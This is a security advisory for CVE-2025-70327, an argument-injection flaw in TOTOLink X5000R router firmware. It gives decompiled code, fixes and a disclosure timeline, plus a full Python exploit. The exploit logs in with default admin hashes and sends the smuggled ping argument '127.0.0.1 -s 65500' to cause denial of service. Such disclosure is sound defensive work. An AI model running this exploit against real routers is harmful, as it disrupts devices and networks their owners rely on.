# CVE-2025-70327
- **Discoverer:** Neighborhood-Hacker Team

- **Vulnerability Type:** Argument Injection (CWE-88)

## 1. Vulnerability Title
    
#### a.  TOTOLink X5000R_Latest bug fix version v9.1.0cu_2415_B20250515 Ping of Death

## 2. High-level overview of the vulnerability and the possible effect of using it

In the `setDiagnosisCfg` handler of the `/usr/sbin/lighttpd` executable, user-supplied parameters are embedded into a system command without validating or rejecting hyphen-prefixed arguments. This argument-injection issue (similar to CVE-2025-52905) lets an attacker smuggle arbitrary command-line options into the invoked tool (e.g., ping). By supplying crafted flags, an attacker can trigger a denial of service (DoS)-for example, by forcing extremely long runtimes or resource-intensive behavior-leading to router hangs/reboots and the potential to overwhelm remote hosts or upstream networks.

## 3. Exact product that was found to be vulnerable including complete version information
#### a. vulnerable code exists in TOTOLink X5000R_Latest

#### b. We tested the vulnerability on TOTOLink X5000R_Latest bug fix version v9.1.0cu_2415_B20250515

## 4. Root Cause Analysis

Since vendor does not provide source code, the following explanation is based on the firmware binary /usr/sbin/lighttpd

#### a. Detailed description of the vulnerability
    
In the function sub_413BB8, the user-controlled ip parameter is copied straight into a shell command without sanitization:

    snprintf(v6, 128, "ping %s -w %d &>/var/log/pingCheck", Var, v3);
    CsteSystem(v6, 0);

Because Var (from websGetVar(..., "ip", ...)) is only checked by is_cmd_string_valid and not restricted from starting with a hyphen, an attacker can inject option-like arguments (e.g., strings beginning with -). This is an argument-injection flaw: the program believes it's inserting a hostname, but the shell-constructed line hands those hyphen-prefixed tokens to ping as flags. By supplying abusive options that prolong execution or increase workload, an attacker can cause a denial of service (DoS) - tying up the router's process/thread and CPU or generating excessive traffic toward remote hosts.

```c
int __fastcall sub_413BB8(int a1)
{
  int v2; // $v0
  int v3; // $s1
  const char *Var; // [sp+24h] [-90h]
  _BYTE v6[128]; // [sp+2Ch] [-88h] BYREF

  memset(v6, 0, sizeof(v6));
  Var = (const char *)websGetVar(a1, "ip", "www.baidu.com");
  v2 = websGetVar(a1, "num", "");
  v3 = atoi(v2);
  if ( is_cmd_string_valid(Var) )
  {
    snprintf(v6, 128, "ping %s -w %d &>/var/log/pingCheck", Var, v3);
    CsteSystem(v6, 0);
    sub_4038F8("0", "reserv");
    return 1;
  }
  else
  {
    sub_4038F8("0", "Parameter Error!");
    return 0;
  }
}
```

#### b. suggested fixes

Add validation to reject values beginning with '-' and move from shell-based execution to exec* with an argv array and -- end-of-options delimiter; additionally, enforce strict allow-listing for host/IP and bound all numeric parameters.

    
## 5. Exploit

```python
import requests
import json
import hashlib
import time
import re
import sys
import ipaddress

# --- 1. Login authentication function: get_auth_session (user-provided code as is) ---

def get_auth_session(ip_address, username_hash, password_hash):
    """
    Send a login authentication request and return an authenticated session object upon successful authentication.
    """
    url = f"http://{ip_address}/cgi-bin/cstecgi.cgi"
    
    payload = {
        "username": username_hash,
        "password": password_hash,
        "flag": "0",
        "topicurl": "loginAuth",
        "token": "" 
    }

    # Request Header
    headers = {
        "Host": ip_address,
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "ko-KR,ko;q=0.9",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        "Origin": f"http://{ip_address}",
        "Referer": f"http://{ip_address}/login.html",
        "Connection": "keep-alive"
    }

    data_string = json.dumps(payload, separators=(',', ':'))

    print(f"Start login request: {url}")
    print(f"Payload: {data_string}")

    s = requests.Session()
    s.headers.update(headers)

    try:
        response = s.post(url, data=data_string, verify=False, timeout=10)
        
        print(f"\n--- Response information (loginAuth) ---")
        print(f"Response status code: {response.status_code}")
        print(f"Response Body Raw Text:")
        print(response.text) 
        
        response_text = response.text.strip()
        
        is_success = response.status_code == 200 and (re.search(r'"loginFlag"\s*:\s*0', response_text) is not None)
        
        if is_success:
            print("\n[+] **Verify login success! Proceed to the next step")
            return s # Return Authenticated Session Object
        else:
            print("\nLogin failed. No pattern was found in the response signal indicating success.")

    except requests.exceptions.RequestException as e:
        print(f"\nRequest Error Occurred: {e}")
        
    return None # Return None on Failure

# --- 2. Configuration request processing function (add command execution result separation logic) ---

def handle_config_requests(ip_address, token_value, auth_session):
    
    url = f"http://{ip_address}/cgi-bin/cstecgi.cgi"
    
    # 2-1. First request: getWizardCfg (verify authentication token)
    print("\n" + "="*50)
    print("1. getWizardCfg request (check authentication token)")
    print("="*50)
    
    get_payload = {"topicurl": "getWizardCfg", "token": token_value}
    get_data = json.dumps(get_payload, separators=(',', ':'))
    
    try:
        response = auth_session.post(url, data=get_data, verify=False, timeout=10)
        
        if "errcode" not in response.text or "token invalid" not in response.text:
            print(f"Response Status Code: {response.status_code}")
            print("Response Body:", response.text)
            print("\n[+] **getWizardCfg Successful:** Authenticated tokens are valid. Try the following setup request.")
        else:
            print(f"Response Status Code: {response.status_code}")
            print("\n[-] getWizardCfg failed: token is invalid skip command insert request.")
            print("Response Body:", response.text)
            return


    except requests.exceptions.RequestException as e:
        print(f"\n[Error] getWizardCfg request failed: {e}")
        return

    set_payload = {
        "topicurl": "setDiagnosisCfg",
        "ip": "127.0.0.1 -s 65500",
        "num": "10",
        "token": token_value
    }
    
    set_data = json.dumps(set_payload, separators=(',', ':'))
    
    print(f"Payload: {set_data}")
    
    try:
        response = auth_session.post(url, data=set_data, verify=False) 
        
        json_start = response.text.find('{')
        
        if json_start != -1:
            cmd_output = response.text[:json_start].strip()
            json_response = response.text[json_start:].strip()
            
            print(f"\nResponse Status Code: {response.status_code}")
            print("\n==============================================")
            print("[+] Command Execution Results (Raw Output)")
            print("==============================================")
            print(cmd_output)
            print("\n==============================================")
            print("[+] Server's final JSON response")
            print("==============================================")
            print(json_response)
        else:
            print(f"\nResopnse Status Code: {response.status_code}")
            print("Response Body (JSON not found):")
            print(response.text)

    except requests.exceptions.ReadTimeout:
        print("\n**[-] Read Timeout Occurred! (Over 10 seconds)** The server may have delayed response after executing the command.")
        print(" Return to the VM to see the results of the command execution.")
        
    except requests.exceptions.RequestException as e:
        print(f"\n[Error] Setting request error occurred: {e}")

# --- 3. Practice ---

def validate_ip(ip_address):
    """IP address format validation"""
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False

if __name__ == "__main__":
    
    # 3.0. Getting an IP address from a user
    while True:
        IP_ADDR = input("Enter the destination IP address to access (e.g. 192.168.0.12): ").strip()
        if validate_ip(IP_ADDR):
            break
        else:
            print("[Error] This is not a valid IP address format. Please re-enter.")
            
    USER_HASH = "21232f297a57a5a743894a0e4a801fc3" 
    PASS_HASH = "21232f297a57a5a743894a0e4a801fc3" 
    
    print(f"\nDestination IP address: {IP_ADDR}")

    # 3.1. Attempt to obtain an authenticated session object
    auth_session = get_auth_session(IP_ADDR, USER_HASH, PASS_HASH)
    
    # 3.2. If the authentication is successful, the next time you request it
    if auth_session:
        print("\n\n--- Step 1: Enter authentication token values ---")
        input_token = input("Please enter a new token (value to try): ")
        
        handle_config_requests(IP_ADDR, input_token, auth_session)
    else:
        print("\nThe final authentication was not successful. The following requests could not be processed.")
```

## 6. Disclosure Timeline
- 2025-10-22: Vulnerability reported to vendor (TOTOLINK).
- 2025-12-21: No response from vendor after 60 days.
- 2025-12-22: Vulnerability reported to MITRE (CVE Assignment Team).
- 2026-02-11: CVE ID assigned (RESERVED state).
- 2026-02-23: Public disclosure (0-day) and notification to MITRE for publication.
